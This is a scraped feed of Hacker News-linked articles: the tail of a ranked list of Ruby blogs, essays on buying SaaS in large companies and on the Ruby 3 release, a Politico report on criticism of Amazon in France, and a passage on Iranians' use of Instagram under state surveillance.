<p>Arkency is a ruby blog that has published articles from various authors since 2012. The content ranges from beginner to advanced; however, the quality of writing varies from author to author. The blog’s structure is a little confusing, and it isn’t the most consistently updated, but it’s a great resource overall.</p>

<ul>
  <li>Writing Quality - 4</li>
  <li>Consistency - 3</li>
  <li>Longevity - 5</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 4</li>
</ul>

<p><strong>Overall Score: 4.2</strong></p>

<h3 id="8-reddits-rruby">8. <a href="https://www.reddit.com/r/ruby/">Reddit’s r/ruby</a></h3>

<p>Reddit for Rubyists is the subreddit for tutorials and updates about Ruby. It has a large community of 68,000 people who are ready to help you answer your questions about the language or any frameworks. While the content quality varies, most posts that are upvoted to the front page are quite useful.</p>

<ul>
  <li>Writing Quality - 4</li>
  <li>Consistency - 3</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 4.2</strong></p>

<h3 id="9-bigbinary">9. <a href="https://blog.bigbinary.com/">BigBinary</a></h3>

<p>BigBinary is an agency blog that details major updates to Ruby, Rails, and several related topics. Most of the articles and tutorials are based on open-source development for Ruby, but there is a mix of front-end topics as well. Most of the time, a new post is published once a month and includes images, code samples, and links to improve your understanding.</p>

<ul>
  <li>Writing Quality - 4</li>
  <li>Consistency - 2</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 4.0</strong></p>

<h3 id="10-stackify-blog">10. <a href="https://stackify.com/blog/">Stackify Blog</a></h3>

<p>In addition to Ruby news and tutorials, Stackify offers posts on a variety of topics for web developers. While most of the topics revolve around error tracking, application logs, and performance, the wide range of writers means wide-ranging quality differences between each piece. There’s also not a great way to filter by Ruby topics alone, so you’ll have to sift through a lot of content if you’re focusing on Ruby.</p>

<ul>
  <li>Writing Quality - 4</li>
  <li>Consistency - 2</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 4.0</strong></p>

<h3 id="11-virteous-code">11. <a href="https://avdi.codes/blog/">Virteous Code</a></h3>

<p>Virtuous Code is a Ruby blog that was started by Avdi Grimm. Most of the blog content is about team growth and building Ruby software, including announcements, code fragments, resources, and tutorials. Avdi updates the blog quite frequently and goes into considerable technical detail when required.</p>
<ul>
  <li>Writing Quality - 2</li>
  <li>Consistency - 4</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 4.0</strong></p>

<h3 id="12-nopio">12. <a href="https://www.nopio.com/blog/">Nopio</a></h3>

<p>The Nopio blog explains Ruby concepts as well as business and organizational topics. Their blog espouses their team’s high standards of quality and transparency.</p>

<ul>
  <li>Writing Quality - 2</li>
  <li>Consistency - 1</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 3.8</strong></p>

<h3 id="13-railsware-blog">13. <a href="https://railsware.com/blog/">Railsware Blog</a></h3>

<p>Railsware is another web development agency whose blog includes useful tips on Ruby, management, design, and culture. Publications on Ruby are scarce as articles are only published every couple of months, but they’re well-written when they come.</p>

<ul>
  <li>Writing Quality - 3</li>
  <li>Consistency - 3</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 4</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 3.8</strong></p>

<h3 id="14-ruby-tapas">14. <a href="https://www.rubytapas.com/">Ruby Tapas</a></h3>

<p>Ruby Tapas is another resource from Avdi Grimm aimed at intermediate Ruby developers who want to advance to the next level of mastery. New screencasts are released twice a week and introduce a wide variety of intermediate to advanced techniques, including object-oriented design principles, testing practices, refactoring skills, and software architecture. The content is well-organized and easy to follow.</p>

<ul>
  <li>Writing Quality - 4</li>
  <li>Consistency - 3</li>
  <li>Longevity - 3</li>
  <li>Technical Depth - 4</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 3.8</strong></p>

<h3 id="15-akita-on-rails">15. <a href="https://www.akitaonrails.com/">Akita on Rails</a></h3>

<p>Akita on Rails was created by Fabio Akita in 2006 and includes the best Portuguese content for Ruby developers. There are a variety of blog posts for beginner, intermediate, and advanced Ruby developers. Some articles are based on Ruby gems, and most of the posts include helpful details like GIFs and code snippets.</p>

<ul>
  <li>Writing Quality - 3</li>
  <li>Consistency - 3</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 4</li>
  <li>Broad Usefulness - 4</li>
</ul>

<p><strong>Overall Score: 3.6</strong></p>

<h3 id="16-railwaymen">16. <a href="https://blog.railwaymen.org/">Railwaymen</a></h3>

<p>Railwaymen features posts on Ruby, Rails, and related development topics. Articles are thoroughly researched and written, but the blog’s publishing frequency is only occasional.</p>

<ul>
  <li>Writing Quality - 2</li>
  <li>Consistency - 3</li>
  <li>Longevity - 3</li>
  <li>Technical Depth - 4</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 3.4</strong></p>

<h3 id="17-karol-galanciak">17. <a href="https://karolgalanciak.com/blog/">Karol Galanciak</a></h3>

<p>Karol is a distributed systems architect and the founder of the Karol Galanciak blog. Most of the articles published on the blog relate to Ruby with a healthy dose of other topics, including microservices, performance optimizations, Kafka, RabbitMQ, and event-driven systems. The tutorials are detailed, and the code snippets are easy to follow. New posts are published once every two months, but they cannot be filtered on the blog, so reading older content can be difficult.</p>

<ul>
  <li>Writing Quality - 2</li>
  <li>Consistency - 3</li>
  <li>Longevity - 3</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 4</li>
</ul>

<p><strong>Overall Score: 3.4</strong></p>

<h3 id="18-hix-on-rails">18. <a href="https://hixonrails.com/ruby-on-rails-tutorials/">Hix on Rails</a></h3>

<p>Hix on Rails is a comprehensive blog, including Ruby tutorials and guides for all skill levels. Most of the recently published tutorials are based on integrating Ruby with DevOps tools like Github and CircleCI.</p>

<ul>
  <li>Writing Quality - 3</li>
  <li>Consistency - 3</li>
  <li>Longevity - 3</li>
  <li>Technical Depth - 3</li>
  <li>Broad Usefulness - 3</li>
</ul>

<p><strong>Overall Score: 3.0</strong></p>

<h3 id="19-schneems">19. <a href="https://schneems.com/">SCHNEEMS</a></h3>

<p>The Schneems blog was founded by Richard Schneeman. It focuses on Ruby performance and building open-source applications. New posts are released every month, and while technically detailed, some of the posts are not necessarily friendly to Ruby beginners. Regardless, the blog is worth reading.</p>

<ul>
  <li>Writing Quality - 3</li>
  <li>Consistency - 3</li>
  <li>Longevity - 3</li>
  <li>Technical Depth - 3</li>
  <li>Broad Usefulness - 3</li>
</ul>

<p><strong>Overall Score: 3.0</strong></p>

<h3 id="20-rubyguides">20. <a href="https://www.rubyguides.com/">RubyGuides</a></h3>

<p>Jesus Castello founded RubyGuides, and he is the author of most of the articles. The mission of RubyGuides is to help you as possible improve your Ruby skills so that you can write better code and be proud of your work. Articles include topics like Ruby’s working directories, helper methods, hash methods, and scaffolding. The content is useful for intermediate and advanced Ruby developers, and Castello does a good job covering complex programming topics in plain English.</p>

<ul>
  <li>Writing Quality - 2</li>
  <li>Consis…</li></ul></div></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://draft.dev/learn/technical-blogs/ruby">https://draft.dev/learn/technical-blogs/ruby</a></em></p>]]>
            </description>
            <link>https://draft.dev/learn/technical-blogs/ruby</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081862</guid>
            <pubDate>Fri, 13 Nov 2020 13:23:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SaaS Needs a Single Point of Purchase]]>
            </title>
            <description>
<![CDATA[
Score 162 | Comments 153 (<a href="https://news.ycombinator.com/item?id=25081711">thread link</a>) | @alangibson
<br/>
November 13, 2020 | https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html | <a href="https://web.archive.org/web/*/https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href="/2020/11/13/saas-needs-a-single-point-of-purchase.html">
	<h2>SaaS Needs a Single Point of Purchase</h2>
</div><div>
	<p>The unassailable advantage that big cloud providers like AWS and Azure have over the rest of the SaaS industry isn’t their quality or pace of innovation; it’s that they’re a single point of purchase for a variety of services. If there was a single vendor that large corporations could contract with and pay for SaaS, the big cloud providers market share would have hit its peak.</p>

<p>I can’t overstate the importance of purchasing mechanics in the decision of what SaaS to use inside large corporations. Because of the arcane and complex purchasing requirements you run into, the simple act of buying software is incredibly difficult and time consuming. People who’ve never worked in a BigCo often don’t realize what an unspeakable nightmare it can be. Because, you see, one does not simply put it on the credit card.</p>

<h2 id="a-series-of-unfortunate-events">A Series of Unfortunate Events</h2>

<p>I once spent <em>5 months</em> licensing Jira. We first had to get a quote, even though it’s fixed price, because Purchasing’s rules said you have to have a quote. After we got the quote, we realized we had no way to pay Atlassian because they don’t take POs and we didn’t pay any way but PO. Putting software on your corporate credit card was explicitly forbidden. So we had to engage a reseller to act as an intermediary for no other reason that they could pay with a credit card. Of course they then had to get another quote that eventually expired due to their general incompetence. Rinse and repeat for several more months until we finally got access.</p>

<p>We never licensed another SaaS product, though we had plenty of budget for it. Anything we need, we made it work on AWS tough we’d rather not have the maintenance hassle. We use open source when we’d be willing and able to license a tool simply because no one can bring themselves to relive the Jira nightmare.</p>

<h2 id="a-solution">A Solution</h2>

<p>The SaaS industry needs is a go-to biller where teams inside large corporations could license software under a standing PO. To the company, the entire SaaS industry would then look like a single vendor with many products for sale (just like AWS). Teams would no longer have to think long and hard about whether some new SaaS tool was worth putting the effort in to license, because I can tell you the answer usually ends up being ‘Buh, just make it work with AWS.’</p>

<p>I know there are already aggregators like App Sumo. However, they tend to be based more around bargains. Large companies will certainly take a deal, but it’s not a major driver for them. We paid that reseller I mentioned an extra <em>25%</em> just to use their Visa card.</p>

<p>Obviously this is a big ask. It would require a lot of major players to sign on before even launching. Maybe a non-profit SaaS consortium could make it work. What do you think? Madness or genius?</p>

<p><a href="https://news.ycombinator.com/item?id=25081711">Hacker News Discussion Thread</a></p>


</div></div>]]>
            </description>
            <link>https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081711</guid>
            <pubDate>Fri, 13 Nov 2020 13:03:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the Release of Ruby 3 Will Be Monumental]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081697">thread link</a>) | @stanislavb
<br/>
November 13, 2020 | https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/ | <a href="https://web.archive.org/web/*/https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We’ve been living in the shadow of Ruby 2 for seven years now. Seven! <a href="https://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/">Ruby 2 was released in 2013</a> (which incidentally is the same year as the initial public release of React 0.3.0!).</p>

<p>In that span of time, Ruby performance has improved <em>significantly</em> and many, many enhancements to the language have benefited a great many people and projects. We’ve seen companies using Ruby and in many cases Rails become bedrocks of developer and consumer internet infrastructure. GitHub. Shopify. Stripe. Square. AirBnB.</p>

<p>But there has also been some consternation along the way. Is Ruby really a top-tier programming language able to compete with the likes of Javascript, Python, PHP, Go, and beyond? Or was it just a DHH-fueled hype-cycle doomed to inevitable relative obscurity as other technologies and frameworks ascended in its wake? (I don’t actually believe anyone seriously thinks this any more, but you still see the stray head-scratcher whiz by on Hacker News.)</p>

<p>Now we are mere weeks away from a major new Ruby release: version 3. While Ruby 3 is an exciting update with lots of features that make it interesting both now and in the future with various point updates promising even more goodies, I think it’s the <strong>psychology</strong> of turning over from major version 2 to 3 that is most vital to the future health of the community.</p>

<p>Ruby 3 isn’t just a new version. <strong>It’s a new era.</strong></p>

<p>What does this era represent? Let’s list a few talking points I hope we’ll start to push <em>hard</em> and <em>often</em> as Rubyists:</p>

<h3 id="ruby-3-is-fast">Ruby 3 is Fast</h3>

<p>No, I don’t mean Ruby 3 suddenly got a whole lot faster than Ruby 2.7. I mean that Ruby 3 is <em>fast compared to Ruby 2</em>. It’s unfortunate that much of the “Ruby is slow” meme has been a laggard perspective stemming from people’s experiences <em>years ago</em> with the language, or an old version of Rails, or Jekyll, or…the fact is it just wasn’t the zippy experience we’re pleased to enjoy today.</p>

<p>Do we still want even better performance? Of course! But at this point, Ruby is plenty fast as compared to many other “scripting” languages. Most of the time it’s on par with Python. It’s even on par with Javascript. (What? Don’t believe me? <a href="https://css-tricks.com/comparing-static-site-generator-build-times/">Check out how similar Jekyll and Eleventy perform as static site generators.</a>) And as Nate Berskopec often reminds us, your Rails app can perform quite well with just a bit of fine-tuning, and often the typical bottlenecks lie elsewhere in the stack (database, web server, etc.)</p>

<h3 id="ruby-3-is-easy">Ruby 3 is Easy</h3>

<p>These days, you don’t need to wrestle with gem dependency hell or pray to the gods to get Ruby or a Ruby extension to compile. That was “old Ruby”. New Ruby is using a fancy-pants version manager like <code>rbenv</code> combined with Bundler 2.</p>

<p><strong>It just works.</strong></p>

<p>Truly, Ruby is the first thing I install on any new Mac or Linux machine I operate and getting things set up is a piece of cake. Installing Rails. Installing Bridgetown. Installing…whatever. It. Just. Works.</p>

<p>We also have things like Docker and WSL to make things <em>much</em> easier to accomplish on Windows machines if you get stuck wrestling with Win-native Ruby. Heck, you can upload your entire dev environment into the cloud now and use VSCode with remote extensions.</p>

<p>Are there ways Bundler and the ecosystem around Ruby versions/dependencies could be improved? No doubt. But it’s in no way any more complicated or fiddly than the world of npm/yarn, and you don’t see the angry hordes trying to burn down the barn doors over there (except maybe the Deno folks 😉).</p>

<h3 id="ruby-3-is-sleek">Ruby 3 is Sleek</h3>

<p>Ruby isn’t the best choice for all problem domains. It just isn’t. But when it comes to “standard” web development, it often <em>is</em> the best choice. It really is! Spend a few days writing NestJS + TypeORM Typescript code and then come back to Rails. It’s like a breath of fresh, sweet air. And that’s not just when you’re writing controllers or models…it goes all the way up and down the stack.</p>

<p>Ruby just makes everything <em>better</em>. Less code. Less boilerplate. Less ceremony. More streamlined. More properly object-oriented. More polished and pleasurable to read and write. Certainly one could posit there are other web frameworks/languages which have much going for them as well. Laravel is popular with PHP devs, and for good reason. Django is popular with Pythonistas. But can anyone say with a straight face that, all things being equal, PHP is a “superior” programming language to Ruby? Can anyone say that Python—taken as a whole—is more suited to building a website than Ruby is?</p>

<p>I think not. While Ruby wasn’t originally invented as a way to supercharge web development, it found its niche in the rise of such amazing projects as Rails, Rack, Jekyll, plus great APIs by Stripe and many others. It rode much of the early wave of Web 2.0 hits, and that heritage continues to benefit us today.</p>

<h3 id="ruby-3-is-here-to-stay">Ruby 3 is Here to Stay</h3>

<p>Ruby 3 isn’t just another notch on the belt of recent Ruby releases. It’s <strong>Ruby 3.0</strong>. That means we can look forward to 3.1, 3.2, 3.3, and beyond. This is the beginning of a whole new era. New innovations. New patterns. Exciting ideas fusing concepts from other technologies with The Ruby Way. Fresh blood coming into the ecosystem. (Anecdotally, I’m seeing newbies plus returning old-timers jumping into Ruby-based forums and chat rooms <em>all the time</em>, and the pace of interesting new Ruby gems bursting onto the scene finally seems to be increasing after a few years of ho-hum incremental progress.)</p>

<p>The takeaway is this: Ruby 3 represents a moment when we should stand proud as Rubyists and unabashedly proclaim to the bootcamps and engineering departments of the world that we’re open and ready to do business large and small. Sure you could pick something other than Ruby with which to build the next great internet success story. But you’ll definitely be in good company if you do pick Ruby. After all, it’s more likely than not your code will be living in a repository overseen by Ruby (GitHub), you’ll be communicating with your fellow colleagues via Ruby (Basecamp &amp; HEY), you’ll be asking for support via Ruby (Discourse forums), you’ll be researching the latest developer news and techniques via Ruby (Dev.to), and you’ll be spinning up your dev machine while wearing that l33t geek t-shirt you got from an indie vendor via Ruby (Shopify)—that is, after you paid for it via Ruby (Stripe). And when you’re exhausted from all that coding and need to unwind at a private cottage by the beach, Ruby will help you out there too (AirBnB).</p>

<p><em>Excelsior!</em></p>
</div></div>]]>
            </description>
            <link>https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081697</guid>
            <pubDate>Fri, 13 Nov 2020 13:01:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon under fire in France as coronavirus restrictions hit rivals]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081674">thread link</a>) | @Pick-A-Hill2019
<br/>
November 13, 2020 | https://www.politico.eu/article/spotlight-falls-on-amazon-as-french-businesses-are-restricted-by-lockdown-rules/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/spotlight-falls-on-amazon-as-french-businesses-are-restricted-by-lockdown-rules/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
<p>Amazon is trying to fend off a wave of criticism in France as small and large businesses, opposition politicians and members of the government accuse the company of unfairly benefiting from lockdown restrictions.</p>



<p>Frédéric Duval, Amazon's country manager for France, went on a media tour Thursday, telling multiple outlets the company was subject to “fantasies” about its allegedly dominant position in e-commerce.</p>



<p>The tour comes after a chorus of attacks from ministers and opposition figures who said that Amazon could benefit from rules banning the selling of "non-essential" items such as books and makeup products in physical stores.</p>



<p>On Monday, Culture Minister Roselyne Bachelot announced that the government would reduce postal fees to <a href="https://minefi.hosting.augure.com/Augure_Minefi/r/ContenuEnLigne/Download?id=2CC3C034-4B93-4D9E-B73D-5FA3F5C86F25&amp;filename=360%20-%20LE%20GOUVERNEMENT%20MET%20EN%20PLACE%20LA%20PRISE%20EN%20CHARGE%20DES%20FRAIS%20D%E2%80%99EXP%C3%89DITION%20DE%20LIVRES%20DES%20LIBRAIRIES%20IND%C3%89PENDANTES.pdf" target="_blank">facilitate</a> ordering from local bookshops. “Amazon is gorging itself. It’s up to us to not feed it,” she said. </p>



<p>Paris Mayor Anne Hidalgo, who has argued for keeping bookstores open, called for a boycott of the American company.</p>



<p>“We’re absolutely not a dominant player,” <a href="https://www.rtl.fr/actu/economie-consommation/confinement-on-n-est-absolument-pas-un-acteur-dominant-assure-le-dg-france-d-amazon-7800917290" target="_blank">Duval told French radio RTL</a>. According to Kantar, Amazon’s share of France's e-commerce market was 22.2 percent last March.</p>



<p>Retailers also partook in the roast. Supermarket chain Intermarché launched full-page newspaper ads on Thursday titled “Sorry, Amazon” to announce it would also <a href="https://www.bfmtv.com/economie/entreprises/desole-amazon-intermarche-lance-un-drive-solidaire-pour-aider-les-petits-commercants_AD-202011050183.html" target="_blank">help small businesses</a> index and sell their products digitally.</p>



<p>But Amazon has also presented offers and training measures to help French businesses sell online — through Amazon, of course. </p>



<p>Duval described these policies in an interview to Le Parisien, insisting that “we are in no way an adversary to the state. Amazon.fr is a French business based in France."</p>



<p><strong>Local opposition</strong></p>



<p>Amazon is also fighting on local fronts. </p>



<p>This week, tensions have flared around the Alsatian town of Ensisheim near Strasbourg, where a planned 190,000-square-meter warehouse is reportedly being built for Amazon.</p>



<p>Duval denied his company had plans for expansion in Alsace. But on Wednesday, the ecologist-led greater metropolitan area of Strasbourg name-checked the company when it joined the opposition to the project, stressing its attachment to “ecological transition."</p>



<p>Pascal Lacombe, spokesman from the Chaudron des Alternatives, a grassroots organization that joined a protest against the construction on Thursday, said: “It’s the Amazon model in its totality that we refuse.” He cited tax avoidance, surges in traffic and lack of local concentration as areas of concern.</p>



<p>One sore spot for Amazon in France has been conditions at its warehouses and conflicts with unions. In the country, where Amazon runs seven warehouses, a <a href="https://www.politico.eu/article/french-court-upholds-order-limiting-amazon-deliveries-amid-coronavirus-risk/">lawsuit brought by unions</a> led to a <a href="https://www.politico.eu/article/amazon-shutdown-in-france-puts-squeeze-on-macron-government/">court defeat for the company in April</a>, prompting the company to shutter all of its France-based operations until at least May 13. The e-commerce giant threatened to take the case to the French supreme court but eventually <a href="https://www.huffingtonpost.fr/entry/amazon-reouverture-progressive-19-mai_fr_5ebeecd5c5b6c9b944f3e941" target="_blank">sealed a deal</a> with unions to reopen at the end of May.</p>



<p id="block-a2bc29c8-fdaa-47cb-a544-0cc3fe127a00">Not everyone is is going after Amazon, however.</p>



<p id="block-a2bc29c8-fdaa-47cb-a544-0cc3fe127a00">During a question-and-answer session in the Senate on Wednesday, Digital Junior Minister Cédric O went to bat for the company, saying: “The French psychosis on Amazon makes no sense. E-commerce is 10 percent of commerce in France; Amazon is 20 percent of e-commerce. There is no European country where Amazon is lower than France."</p>



<p id="block-f2b7805d-af6e-43b0-b7ec-fc47349f416e"><a href="https://www.politico.eu/article/france-reinstates-digital-tax-courting-trade-war/">President Emmanuel Macron's government is aware of the influence of digital giants</a> and has repeatedly criticised the fact that they emerge as the big winners from the crisis during the first wave of coronavirus crisis.&nbsp;</p>



<p id="block-88d90152-de1f-40db-9282-a5d41050ee81">Bercy is backing at the EU level a reform of competition rules to regulate the <a href="https://www.politico.eu/article/digital-services-act-brussels-plan-to-rein-in-big-tech-takes-shape-thierry-breton-margrethe-vestager/">so-called gatekeepers</a>, of which Amazon is a part.&nbsp;</p>



<p><em>Additional reporting by Elisa Braün and Laura Kayali.</em></p>



<p><em>Want more analysis from <span>POLITICO</span>? <span>POLITICO</span> Pro is our premium intelligence service for professionals. From financial services to trade, technology, cybersecurity and more, Pro delivers real time intelligence, deep insight and breaking scoops you need to keep one step ahead. Email <a href="https://www.politico.eu/cdn-cgi/l/email-protection#c5b5b7aa85b5aaa9acb1aca6aaeba0b0" target="_blank"><span data-cfemail="8bfbf9e4cbfbe4e7e2ffe2e8e4a5eefe">[email&nbsp;protected]</span></a> to request a complimentary trial.</em></p>
								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/spotlight-falls-on-amazon-as-french-businesses-are-restricted-by-lockdown-rules/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081674</guid>
            <pubDate>Fri, 13 Nov 2020 12:58:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Selfies and Sharia Police]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081599">thread link</a>) | @CapitalistCartr
<br/>
November 13, 2020 | https://restofworld.org/2020/selfies-and-sharia-police/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/selfies-and-sharia-police/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>When you scroll through 17-year-old Roya’s Instagram account, her posts look like the countless others with the same influencer aesthetic. In one, she’s posing at sunset in a beaded blue bralette, beige ’90s-style trousers, and a pair of black Converse high-tops, her long curly hair flicking through the air. The caption: a duck emoji.&nbsp;</p>



<p>But Roya, whose name has been changed to protect her identity, posted her pictures from Tehran, where walking in the street without a hijab — let alone in a bralette top — could get you arrested. Though the risks don’t phase the high school senior. The app is important to her; Instagram is the first thing she checks when she wakes up.</p>



<p>Roya is required by Iranian law to adhere to a certain level of modesty in public. On Instagram, she’s often sleeveless, painting her eyelids with bright-green eyeshadow or pasting little mirror pieces over her face. “We dress up for Instagram; we show the best side of ourselves and our lives,” she explained. “But who I am on Instagram is closer to my reality than the person I am when I walk on the streets.”&nbsp;</p>



<p>As the last open social media platform in Iran, Instagram offers a rare glimpse into the interior lives of everyday Iranians: Feeds are filled with blurry Polaroids of house parties, teens snowboarding, and cosy selfies of unmarried couples — images of scenes either banned or frowned upon by the ultraconservative authorities.&nbsp;</p>



<p>But the Iranian regime’s anxiety about a platform previously seen as nothing more than a vapid social network is mounting, especially after the sweeping anti-government protests last year. Instead of smoothies and selfies, Instagram is becoming a platform for political change in Iran. As government informants move to surveil the app, repression is spreading from the streets to social media, forcing Iranians to recalibrate their online presence.&nbsp;</p>



<h3><strong>The last social media platform&nbsp;</strong></h3>



<p>Instagram is the only major social media platform accessible to Iranians without a VPN. After Twitter and Facebook were <a href="http://america.aljazeera.com/opinions/2014/4/iran-twitter-rouhaniinternetcensorship.html">banned in 2009</a>, and <a href="https://www.reuters.com/article/us-iran-telegram-apps/irans-judiciary-bans-use-of-telegram-messaging-app-state-tv-idUSKBN1I11JM">Telegram in 2018</a>, the app became the most popular outlet in the country, with more than 24 <a href="https://financialtribune.com/articles/economy-sci-tech/81384/iran-ranked-world-s-7th-instagram-user">million users</a>. (Iranian President Hassan Rouhani, who came to power on <a href="https://www.vice.com/en_us/article/9aevn7/young-iranians-are-demanding-internet-freedom-this-election">election promises</a> that included improving internet freedom, <a href="https://www.instagram.com/hrouhani/?hl=en">clocks in with 2.2. million followers</a> on his Instagram account.)<strong> </strong>Its popularity has grown during the Covid-19 pandemic, which hit Iran in January and <a href="https://www.bbc.com/news/world-middle-east-53598965">has caused more than&nbsp;42,000 deaths to date</a>. With the virus spreading at an uncontrollable rate, the pandemic kept people indoors — and online — for weeks on end.</p>



<p>Official scrutiny of Instagram began to intensify in December 2018. Iran’s cyber-police announced an unprecedented “society-based” policing initiative, for which 42,000 volunteers were recruited to spy on Iranians’ social media profiles. In February 2019, a number of Iranian Instagram influencers <a href="https://www.middleeasteye.net/news/iranian-press-review-irans-tamed-tigers-instagram">deleted pictures of themselves </a>without hijabs and changed their bios to read, “تابع قوانین جمهوری اسلامی ایران”: “This account abides by the laws of the Islamic Republic.”&nbsp;</p>



<p>Several heavily trafficked accounts like <a href="https://www.instagram.com/mahdis_food/?hl=en" target="_blank" rel="noreferrer noopener">@mahdis_food</a>, a food blogger with more than half a million followers, posted their allegiance to the regime online. In a selfie with her husband, she posted a caption that reads, “I have been asked to join the project to sanitise cyberspace and I have enthusiastically accepted the call.” By November of that year, when authorities arrested 7,000 protesters and effectively shut down the country’s internet for more than 20 days, tensions had risen to a boil.&nbsp;</p>



<p>Roya said the authorities renewed their focus on Instagram after stay-at-home orders were issued in March. “That’s when the hijab law took into place,” she said, referring to a new law passed in May that mandated women wear the traditional headscarf even on social media. “When they couldn’t control people in the streets because we were all quarantining, they were like, Let’s try to control people online and their lives on Instagram.”</p>



<h3><strong>Political aesthetics&nbsp;</strong></h3>



<p>While Instagram doesn’t typically attract the type of political debate one might see on Twitter or Facebook, the use of the app has evolved as a means of organizing during the pandemic. In the U.S., where the Black Lives Matter movement has inspired <a href="https://www.vox.com/the-goods/21359098/social-justice-slideshows-instagram-activism">droves of Instagram users to create aesthetically pleasing political images</a>, the platform has become home to a new format for content. In Iran, <a href="https://www.nytimes.com/2020/07/15/world/middleeast/iran-protests-capital-punishment.html">similar political messaging</a> — color-blocked backgrounds with slogans, hashtags, and chunky texts of information — flooded users’ timelines after the protests last year.</p>



<p>Instagram’s Live feature also became a way for politically motivated influencers to communicate to hundreds of thousands of viewers both in and out of Iran. Kaveh Azarhoosh, an Iranian internet-policy expert based in London, said more than 800 people tuned into the June 3 livestream he hosted with an Iranian political activist about the country’s internet policies. “Although Instagram is not a great platform for organizing, it became okay during the pandemic for people to hold conversations on Live,” said Azarhoosh. “With 800 people watching, it was equivalent to holding a full conference room.”&nbsp;</p>



<p>Mahdieh Golroo utilizes Instagram as a platform for her activism. Golroo, who fled to Sweden after <a href="https://advox.globalvoices.org/2015/01/30/iranian-womens-rights-advocate-mahdieh-golroo-released-from-jail/">a 93-day stint in Iran’s notorious Evin prison</a> for attending a protest against acid attacks, went live on Instagram several times throughout the spring months. <a href="https://www.instagram.com/mahdieh_golroo/?hl=en">Her IGTV videos</a>, which have an average viewership of 3,000 and target Iranian audiences, address taboo subjects like female circumcision and divorce laws.</p>



<p>While Golroo and Azarhoosh are activists, for influencers, too, Instagram has taken a political turn as the situation in Iran becomes more dire.&nbsp;</p>



<p>As a child, New York–based Iranian fashion designer <a href="https://www.instagram.com/hausofmilad/?hl=en">Milad</a> spent his summers with his grandmother in Tehran. Back then, he said, she would gently remind him that wearing shorts and a tank top, his preferred summer outfit, was not acceptable in public, even for men. When Milad came out as queer, he said, he “consciously exiled” himself from Iran, knowing that his sexuality and his country were irreconcilable. (Homosexuality in Iran is <a href="https://www.dw.com/en/iran-defends-execution-of-gay-people/a-49144899">penalized</a> by imprisonment, corporal punishment, and execution.)&nbsp;</p>



<p>After more than seven years away from Iran, Milad said, he’s dependent on platforms such as Instagram, Twitter, and Facebook for news from inside the country. “It’s the only way to know what’s happening,” he told <em>Rest of World</em>.&nbsp;</p>



<p>In July, Milad saw his Instagram overwhelmed with political infographics bearing the hashtag <a href="https://www.bbc.com/news/world-middle-east-53417228">#StopExecutions</a>, as Iranians protested — and succeeded in halting — the death sentence given to three young men who had participated in the mass anti-government demonstrations in November. “Instagram has become absolutely vital. We saw how the act of signing a few petitions and widespread sharing put a stop to the execution of three protesters,” said Milad. As soon as the hashtag started gaining traction, Milad <a href="https://www.instagram.com/tv/CCrCxYtJaPZ/?hl=en">posted a video</a> of himself on IGTV urging his international audience to express solidarity with the protestors. “I am sincerely asking you all to share whatever post you see or come across,” he said, addressing&nbsp;the camera with tears in his eyes, “because it is very hard for us [Iranians] to do this on our own.”&nbsp;</p>


		<figure>
			<div>
